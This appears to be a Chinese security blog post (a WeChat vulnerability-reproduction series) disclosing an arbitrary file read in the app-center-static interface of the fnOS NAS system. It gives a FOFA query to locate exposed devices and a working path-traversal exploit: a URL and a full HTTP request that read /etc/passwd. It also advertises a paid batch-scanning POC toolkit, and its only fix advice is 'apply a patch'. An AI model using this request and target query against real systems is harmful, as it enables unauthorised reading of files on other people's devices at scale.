#  飞牛系统FnOS下app-center-static接口存在导致任意文件读取漏洞 附POC  
2026-2-2更新
                    2026-2-2更新  南风漏洞复现文库   2026-02-01 15:55  
  
   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 飞牛系统FnOS简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
飞牛私有云（fnOS）是一款基于Linux内核（Debian发行版）深度开发的国产免费NAS系统,飞牛系统FnOS  
## 2.漏洞描述  
  
飞牛私有云（fnOS）是一款基于Linux内核（Debian发行版）深度开发的国产免费NAS系统,飞牛系统FnOS下app-center-static接口存在导致任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
飞牛系统FnOS  
![飞牛系统FnOS下app-center-static接口存在导致任意文件读取漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3aMiaeCDDxVppVUYZB6Ruqkxmic1TiaUFeeqbsfkYtt1vO97FtIgXVjucm9DhV333ZPibuARzFJCg9txA/640?wx_fmt=png&from=appmsg "null")  
  
飞牛系统FnOS下app-center-static接口存在导致任意文件读取漏洞  
## 4.fofa查询语句  
  
icon_hash="470295793"|| app="飞牛-私有云fnOS"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd  
  
漏洞数据包：  
```
GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aMiaeCDDxVppVUYZB6RuqkxnehibK3xh6iaXlnYtevKIsNhJR7p1mfkOQ6sYrDy4APprAK6pqjFh5rQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aMiaeCDDxVppVUYZB6RuqkxR0Q0tahJwPmzkHicdNLCaN7socU9xZMJym5qzfV2NqVCrfyfT7mKx0A/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aMiaeCDDxVppVUYZB6RuqkxC6iaq12UUucID2Tsic0uJVLIxAW5QbOUxpOyjQJ2d3O52DMiaWYP9y9hA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aMiaeCDDxVppVUYZB6RuqkxcribrEb1FzHW4qyq6o6ic1ve1hRMq8H6vicLoQo1pQYibMZdemVeWQ1cSA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aMiaeCDDxVppVUYZB6RuqkxEfHoroG1ahWiaylU2V7fRr3UWNhQ6Boiaib3bfXibNXbvEUtQjiaCQC5rFQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aMiaeCDDxVppVUYZB6Ruqkx3BLfWv2blh7ToqcoL94XZlQByjDGO66swXWvSticEfFicJgnMibS1UkDw/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
